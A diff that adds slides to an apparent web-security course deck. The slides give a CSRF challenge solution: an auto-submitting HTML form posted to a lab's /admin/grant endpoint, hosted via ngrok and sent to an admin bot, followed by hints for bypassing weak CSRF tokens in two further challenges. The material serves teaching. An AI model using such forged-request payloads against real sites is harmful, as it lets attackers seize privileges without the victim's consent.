@@ -1008,6 +1008,139 @@ What can go wrong?
 
 
 </div>
+
+---
+
+## Solution
+
+<div class="content-center">
+
+Using **ngrok** + any local web server, we can serve a page like this:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<body>
+  <form method="post"
+        action="https://web11.webhack.it/admin/grant">
+    <input type="hidden" name="uid" value="${YOUR_UID}">
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
+```
+
+<div class="fragment" data-fragment-index="0">
+
+Steps:
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+1. Host this page on your server (e.g., using `python3 -m http.server` + ngrok)
+2. Submit the **ngrok URL** via the `/report` page
+3. The admin visits the URL → the form auto-submits → the admin's session cookie is attached
+4. The `/admin/grant` endpoint grants access to **your UID**
+5. Visit the homepage → restricted content is now accessible!
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-hint">This works because the <code>/admin/grant</code> endpoint does <b>not</b> use any CSRF protection — it relies solely on the session cookie for authentication.</div>
+
+</div>
+
+
+
+</div>
+
+<div class="footnotes">
+
+<sup>*</sup> If you do not want to host the website locally, you can use, e.g., https://tiiny.host/
+
+</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# Challenge ItIsASecretV2
+
+---
+
+## Similar to the previous one... but different!
+
+<div class="content-center">
+
+The form for granting the privilege is now protected by a CSRF token:
+
+```html
+<body class="text-center">
+  <form class="form-signin" method="post">
+    <div class="form-group">
+      <input type="hidden" name="csrf_token" value="XXXXXX" />
+      <input class="form-control" type="text" placeholder="UID" id="uid" name="uid">
+    </div>
+    <br />
+    <button class="btn btn-lg btn-primary btn-block" type="submit">Submit</button>
+    <p class="mt-5 mb-3 text-muted">WebHackIT - <a href="/admin">Admin Panel</a></p>
+  </form>
+</body>
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+<div class="alert alert-hint"><b>HINT</b>: what if the CSRF is implemented incorrectly?</div>
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-hint"><b>HINT</b>: what is a comman mistake? See the slides :)</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# Challenge ItIsASecretV3
+
+---
+
+## Similar to the previous one... but different!
+
+<div class="content-center">
+
+Again, we have a CSRF token... can you bypass it?
+
+<br/>
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+<div class="alert alert-hint"><b>HINT</b>: try to see <i>inside</i> the CSRF token... Can you forge a valid one?</div>
+
+</div>
+
+
+
+</div>
                     </textarea>
                 </section>
             </div>
